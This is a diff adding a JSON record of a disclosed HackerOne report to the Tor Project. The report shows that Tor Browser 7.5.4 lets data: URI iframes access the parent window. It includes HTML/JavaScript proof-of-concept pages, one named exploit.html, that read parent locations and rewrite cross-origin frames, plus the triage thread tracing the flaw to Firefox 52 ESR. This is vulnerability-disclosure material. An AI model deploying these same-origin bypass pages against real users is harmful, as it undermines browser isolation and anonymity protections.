@@ -1,0 +1,385 @@
+{
+    "id": 358005,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTgwMDU=",
+    "url": "https://hackerone.com/reports/358005",
+    "title": "Tor Browser: iframe with `data:` uri  has access to parent window",
+    "state": "Closed",
+    "substate": "informative",
+    "severity_rating": "high",
+    "readable_substate": "Informative",
+    "created_at": "2018-05-27T00:30:07.597Z",
+    "submitted_at": "2018-05-27T00:30:07.597Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "metnew",
+        "url": "/metnew",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 1800,
+        "url": "https://hackerone.com/torproject",
+        "handle": "torproject",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Tor",
+            "twitter_handle": "torproject",
+            "website": "https://www.torproject.org/",
+            "about": "Anonymity Online"
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2018-06-06T19:56:28.922Z",
+    "bug_reporter_agreed_on_going_public_at": "2018-06-06T01:29:58.493Z",
+    "team_member_agreed_on_going_public_at": "2018-06-06T19:56:28.856Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Version:\n7.5.4 (based on Mozilla Firefox 52.8.0)\nTested with standard security slider. However, it's likely to be possible with a higher security level.\n\n## Summary\n\nIn Tor Browser iframe with `data:uri` inherits the origin of parent window.\nThat leads to iframe has access to parent window.\n\n## PoC\n\n### Iframe could access parent window's location\n\n>  iframe-access-parent.html \n```html\n<body>\n    <script>\n        let f = document.body.appendChild(document.createElement('iframe'))\n        f.src =\n            'data:text/html,' +\n            `<script>alert(parent.location)</scrip` + `t>` \n        // should throw \"SecurityError...\", instead `alert()` works\n    </script>\n</body>\n```\n\n### iframe could access another iframe with src=data uri\n\n> data-uri-access-another-data-uri.html\n```html\n<body>\n    <script>\n        let g = document.body.appendChild(document.createElement('iframe'))\n        let f = document.body.appendChild(document.createElement('iframe'))\n\n        g.src =\n            'data:text/html,' + 'First iframe with data:uri'\n\n        f.src =\n            'data:text/html,' +\n            `Second iframe with data:uri <script>alert(\"Iframe with data:uri could access another same-origin iframe with data:uri, first iframe location is: \" + parent.window.frames[0].location.href)</scr` + `ipt>`\n\n    </script>\n</body>\n```\n\n### data:uri iframe could rewrite content of another cross-origin iframe via data:uri\n\n##### 127.0.0.1:5000/exploit.html\n\n```html\n<body>\n    <script>\n        let g = document.body.appendChild(document.createElement('iframe'))\n        let f = document.body.appendChild(document.createElement('iframe'))\n\n        g.src =\n            'http://127.0.0.1:5001/5001.html'\n\n        g.onload = () => {\n            f.src =\n                'data:text/html,' +\n                `Second iframe with data:uri \n                <script>\n                    if (!parent.window.frames[0][0]) {\n                        console.log('This block called in the context of |Second iframe with data:uri|');\n                        console.log('If first script sets parent.window.location to some valid value');\n                        console.log('it removes parent.window.frames[0][0].location from the DOM');\n                        console.log('Tor re-runs script in this cause, but in context of this window');\n                        console.log('e.g. window with |Second iframe with data:uri| text');\n                    } else {\n                        parent.window.frames[0][0].location = \"data:text/html,5000 iframe rewrites  5001<script>\n                        window.onload = () => {\n                            console.log('This block called in the context of |5000 iframe rewrites 5001|');\n                            parent.window.location = 'about:blank'\n                        }\n                        </scr\" + \"ipt>\";\n                    }\n                    \n                </scr` + `ipt>`\n        }\n\n    </script>\n    <h4>we could rewrite data:uri in crossdomain windows</h4>\n</body>\n```\n\n##### 127.0.0.1:5001/5001.html\n```html\n<html>\n\n<body>\n    <script>\n        let y = document.body.appendChild(document.createElement('iframe'))\n        y.src = 'data:text/html,datauri 5001'\n    </script>\n</body>\n\n</html>\n```\n\nThe iframe from 5000 port could rewrite an iframe in a different origin, but it doesn't have access to \"parent\" at 5001 port, so direct UXSS is impossible.\n\n> Also, there is an interesting case described in PoC. Function in the iframe from port 5000 called twice in different contexts. \n\n## Expected behavior\n\n### 1. In latest Chrome, Firefox, Safari iframe with `data:` uri has `null` origin and can't access parent window's location.\n\nPoC in Chrome/FF/Safari throws error:\n\n```\nSecurityError: Blocked a frame with origin \"null\" from accessing a frame with origin \"http://127.0.0.1:5000\".  The frame requesting access has a protocol of \"data\", the frame being accessed has a protocol of \"http\". Protocols must match.\n```\n\n### 2. iframe can't rewrite another iframe's content via data uri.\nSame as in the 1 case.\n\n```\nSecurityError: Permission denied to access property \"href\" on cross-origin object\n```\n\n### 3.\n\nFF\n```\nNS_ERROR_DOM_PROP_ACCESS_DENIED: Access to property denied\n```\n\nChrome/Safari\n```\nUnsafe JavaScript attempt to initiate navigation for frame with URL...\nSecurityError: The operation is insecure.\n```\n\n## Impact\n\nPartial SOP violation. \nDirect UXSS seems impossible, but described behavior opens a wide range of attack scenarios.\n1. Any malicious iframe src=`data:uri` could access parent\n2. Any malicious iframe src=`data:uri` could rewrite other frames's location (to data:uri too) in DOM using `parent.window.frames`",
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 302257,
+            "file_name": "data-uri-access-another-data-uri.html",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/257/52aa3d790b4ed9baf2b79b7185794a254e8a57d0/data-uri-access-another-data-uri.html?response-content-disposition=attachment%3B%20filename%3D%22data-uri-access-another-data-uri.html%22%3B%20filename%2A%3DUTF-8%27%27data-uri-access-another-data-uri.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073944Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=723a91c4208b57f27e42902655effd4dc21f0cb9240326b95490df482ca31f15",
+            "file_size": 538,
+            "type": "text/html"
+        },
+        {
+            "id": 302258,
+            "file_name": "iframe-access-parent.html",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/258/0e7a7e91b2406cd159329beb7ff2bb52f7aa38c7/iframe-access-parent.html?response-content-disposition=attachment%3B%20filename%3D%22iframe-access-parent.html%22%3B%20filename%2A%3DUTF-8%27%27iframe-access-parent.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073944Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=8edead70033ab1738a0a791876c15d49a475da54bf6542068422fc0f23f585af",
+            "file_size": 269,
+            "type": "text/html"
+        },
+        {
+            "id": 302259,
+            "file_name": "5001.html",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/259/66958ca808a454f3c5ec385f9135b7c6766f808a/5001.html?response-content-disposition=attachment%3B%20filename%3D%225001.html%22%3B%20filename%2A%3DUTF-8%27%275001.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073944Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=a6a9cb6341a1e55b64f10a540ab595ceff5db7ac83542745f1de2d8fc1302952",
+            "file_size": 180,
+            "type": "text/html"
+        },
+        {
+            "id": 302260,
+            "file_name": "exploit.html",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/260/5286659bc7df61df007fcc13df37484766668797/exploit.html?response-content-disposition=attachment%3B%20filename%3D%22exploit.html%22%3B%20filename%2A%3DUTF-8%27%27exploit.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073944Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=41019860dded7cd767a25c4048e4df5c2172588ae8df1dd06e4e99317520ee6d",
+            "file_size": 1598,
+            "type": "text/html"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 0,
+    "voters": [],
+    "severity": {
+        "rating": "high",
+        "author_type": "User"
+    },
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 2806648,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "What do you mean with \"latest Firefox\"? There is more than one latest Firefox: There is Firefox 60.0.1, Firefox 60.0.1 ESR, and Firefox 52.8.0 ESR. We are still following the ESR 52 series while we are preparing the switch to ESR 60. Are you claiming that Firefox 52.8.0 ESR does not inhibit that flaw while Tor Browser 7.5.4 does? If not, have you contacted Mozilla to report this bug as well? To test a normal Firefox 52.8.0 ESR you can download a version from https://www.mozilla.org/en-US/firefox/organizations/all/#legacy.",
+            "automated_response": false,
+            "created_at": "2018-05-28T18:13:04.751Z",
+            "updated_at": "2018-05-28T18:13:04.751Z",
+            "actor": {
+                "username": "geko",
+                "cleared": false,
+                "verified": false,
+                "url": "/geko",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "torproject"
+        },
+        {
+            "id": 2806650,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNeedsMoreInfo",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-05-28T18:13:15.936Z",
+            "updated_at": "2018-05-28T18:13:15.936Z",
+            "actor": {
+                "username": "geko",
+                "cleared": false,
+                "verified": false,
+                "url": "/geko",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "torproject"
+        },
+        {
+            "id": 2806746,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNew",
+            "message": "Yeah, looks like it's Firefox 52 bug\nSorry, for the report :(",
+            "automated_response": false,
+            "created_at": "2018-05-28T18:30:21.497Z",
+            "updated_at": "2018-05-28T18:30:21.497Z",
+            "actor": {
+                "username": "metnew",
+                "cleared": false,
+                "verified": false,
+                "url": "/metnew",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "torproject"
+        },
+        {
+            "id": 2806922,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "No worries. I guess that's something Mozilla fixed along with all the other fixes that landed in the Firefox 57/58 timeframe, like https://blog.mozilla.org/security/2017/10/04/treating-data-urls-unique-origins-firefox-57/.",
+            "automated_response": false,
+            "created_at": "2018-05-28T19:18:41.030Z",
+            "updated_at": "2018-05-28T19:18:41.030Z",
+            "actor": {
+                "username": "geko",
+                "cleared": false,
+                "verified": false,
+                "url": "/geko",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "torproject"
+        },
+        {
+            "id": 2806962,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I filled a report to Mozilla, but as I understand, ESR should be patched against this, so that's a vulnerability anyway. Hope, they will qualify it as a valid security bug, because of Tor.\nThanks for a quick response!",
+            "automated_response": false,
+            "created_at": "2018-05-28T19:26:25.135Z",
+            "updated_at": "2018-05-28T19:26:25.135Z",
+            "actor": {
+                "username": "metnew",
+                "cleared": false,
+                "verified": false,
+                "url": "/metnew",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "torproject"
+        },
+        {
+            "id": 2815515,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Could you give us a link to your bug report, so that we can follow it?",
+            "automated_response": false,
+            "created_at": "2018-05-30T07:27:14.851Z",
+            "updated_at": "2018-05-30T07:27:14.851Z",
+            "actor": {
+                "username": "geko",
+                "cleared": false,
+                "verified": false,
+                "url": "/geko",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "torproject"
+        },
+        {
+            "id": 2817718,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "https://bugzilla.mozilla.org/show_bug.cgi?id=1464884",
+            "automated_response": false,
+            "created_at": "2018-05-30T13:19:05.858Z",
+            "updated_at": "2018-05-30T13:19:05.858Z",
+            "actor": {
+                "username": "metnew",
+                "cleared": false,
+                "verified": false,
+                "url": "/metnew",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "torproject"
+        },
+        {
+            "id": 2847761,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-06-06T01:29:58.520Z",
+            "updated_at": "2018-06-06T01:29:58.520Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "metnew",
+                "cleared": false,
+                "verified": false,
+                "url": "/metnew",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "torproject"
+        },
+        {
+            "id": 2847766,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "FF team rejected to fix this problem in ESR52 and ESR60, so Tor browser will continue being vulnerable against this.\nLink: https://bugzilla.mozilla.org/show_bug.cgi?id=1464884",
+            "automated_response": false,
+            "created_at": "2018-06-06T01:31:52.799Z",
+            "updated_at": "2018-06-06T01:33:54.587Z",
+            "actor": {
+                "username": "metnew",
+                "cleared": false,
+                "verified": false,
+                "url": "/metnew",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "torproject"
+        },
+        {
+            "id": 2851290,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-06-06T19:56:28.881Z",
+            "updated_at": "2018-06-06T19:56:28.881Z",
+            "actor": {
+                "username": "geko",
+                "cleared": false,
+                "verified": false,
+                "url": "/geko",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "torproject"
+        },
+        {
+            "id": 2851291,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-06-06T19:56:28.944Z",
+            "updated_at": "2018-06-06T19:56:28.944Z",
+            "actor": {
+                "username": "geko",
+                "cleared": false,
+                "verified": false,
+                "url": "/geko",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "torproject"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
